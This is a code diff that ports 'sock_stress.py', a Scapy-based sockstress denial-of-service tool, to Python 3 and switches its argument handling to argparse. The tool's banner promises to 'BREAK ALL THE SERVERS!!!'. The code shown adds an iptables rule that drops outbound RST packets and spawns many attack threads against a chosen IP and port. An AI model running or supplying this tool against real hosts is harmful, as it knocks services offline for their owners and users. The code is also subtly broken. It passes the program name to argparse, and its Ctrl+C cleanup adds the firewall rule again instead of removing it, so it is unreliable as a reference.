@@ -12,6 +12,7 @@
  Python 3 port: January 2025 by movatica
 """
 
+import argparse
 from ipaddress import IPv4Address
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -27,24 +28,13 @@ from scapy.layers.inet import IP, TCP
 from scapy.sendrecv import send, sr1
 
 
-print("\n*******************************************************")
-print("**  Python Sock Stress DoS                           **")
-print("**  by Pan0pt1c0n (Justin Hutchens)                 **")
-print("**  BREAK ALL THE SERVERS!!!                         **")
-print("*******************************************************\n\n")
-
-if len(sys.argv) != 4:
-    print("Usage - ./sock_stress.py [Target-IP] [Port Number] [Threads]")
-    print("Example - ./sock_stress.py 10.0.0.5 21 20")
-    print("Example will perform a 20x multi-threaded sock-stress DoS attack ")
-    print("against the FTP (port 21) service on 10.0.0.5")
-    print("\n***NOTE***" )
-    print("Make sure you target a port that responds when a connection is made")
-    sys.exit()
-
-dstaddr = IPv4Address(sys.argv[1])
-dstport = int(sys.argv[2])
-threads = int(sys.argv[3])
+def commandline(argv: list[str]) -> argparse.Namespace:
+    """ Commandline arguments """
+    parser = argparse.ArgumentParser()
+    parser.add_argument('target', type=IPv4Address)
+    parser.add_argument('port', type=int)
+    parser.add_argument('-t', '--threads', type=int, default=20)
+    return parser.parse_args(argv)
 
 
 def sockstress(dstaddr: IPv4Address, dstport: int) -> None:
@@ -70,17 +60,26 @@ def sockstress(dstaddr: IPv4Address, dstport: int) -> None:
 def graceful_shutdown(signal, frame):
     print('\nYou pressed Ctrl+C!')
     print('Fixing IP Tables')
-    os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + str(dstaddr) + ' -j DROP')
+    os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + str(options.target) + ' -j DROP')
     sys.exit()
 
+
+print("\n*******************************************************")
+print("**  Python Sock Stress DoS                           **")
+print("**  by Pan0pt1c0n (Justin Hutchens)                 **")
+print("**  BREAK ALL THE SERVERS!!!                         **")
+print("*******************************************************\n\n")
+
+options = commandline(sys.argv)
+
 ## Creates IPTables Rule to Prevent Outbound RST Packet to Allow Scapy TCP Connections
-os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + str(dstaddr) + ' -j DROP')
+os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + str(options.target) + ' -j DROP')
 signal.signal(signal.SIGINT, graceful_shutdown)
 
 ## Spin up multiple threads to launch the attack
 print("The onslaught has begun...use Ctrl+C to stop the attack")
-for _ in range(threads):
-    start_new_thread(sockstress, (dstaddr,dstport))
+for _ in range(options.threads):
+    start_new_thread(sockstress, (options.target, options.port))
 
 ## Make it go FOREVER (...or at least until Ctrl+C)
 while True:
